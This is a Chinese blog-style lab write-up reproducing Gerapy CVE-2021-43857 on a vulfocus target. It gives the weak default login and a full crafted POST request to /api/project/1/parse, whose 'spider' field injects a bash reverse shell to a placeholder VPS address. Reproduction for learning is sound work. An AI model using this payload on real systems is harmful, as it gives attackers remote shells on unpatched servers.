# Gerapy-CVE-2021-43857 - Colin.B - 博客园

> 原文：[`www.cnblogs.com/colin-B/p/15796480.html`](https://www.cnblogs.com/colin-B/p/15796480.html)

背景：
Gerapy 是一个分布式爬虫管理框架。0.9.8 版本之前的 Gerapy 容易受到远程代码执行的影响，此问题已在 0.9.8 版本中修复。 登录：admin/admin 复现之前先登入后，创建一个项目。

漏洞编号：
CVE- 2021-43857

影响版本：
< 0.9.8

复现步骤：
1，打开漏洞环境 vulfocus
![](img/659894e2f9ab47b9d12f9664be264b1a.png)
![](img/fc67b31b733abef6153711eac45b55cb.png)

2，使用弱口令进入后台，点击项目管理
![](img/7b45d3e6732a3529b17b76663bc8eac8.png)

3，抓包
![](img/1f9f8bca8a0067a55377372260973a85.png)

4，构造数据包 POST

```
POST /api/project/1/parse HTTP/1.1
Host: vulfocus.fofa.so:37380
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: application/json, text/plain, */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
Authorization: Token 4f2273e09d59f4de6edf58bb28d9f96e0fefd40e
Connection: close
Referer: http://vulfocus.fofa.so:37380/
Cookie: zbx_sessionid=80402dd7222257588aeff3a3f5a4b7af; td_cookie=448830462; Hm_lvt_b5514a35664fd4ac6a893a1e56956c97=1639631760; zmGroup=1; Hm_lvt_deaeca6802357287fb453f342ce28dda=1640325563
Cache-Control: max-age=0
Content-Length: 79
Content-Type: application/x-www-form-urlencoded

{
	"spider":"`/bin/bash -c 'bash -i >& /dev/tcp/VPS IP/1234 0>&1'`"
} 
```

![](img/ba5c56129ca07b6c466151d6a18c6cad.png)

5，VPS 开启监听，并发送构造好的 POST 包
![](img/68af284f7fa2b40f6b64ef7c00fa133c.png)

6，得到 flag
![](img/d75fce02397629bb7eb3c1281edba582.png)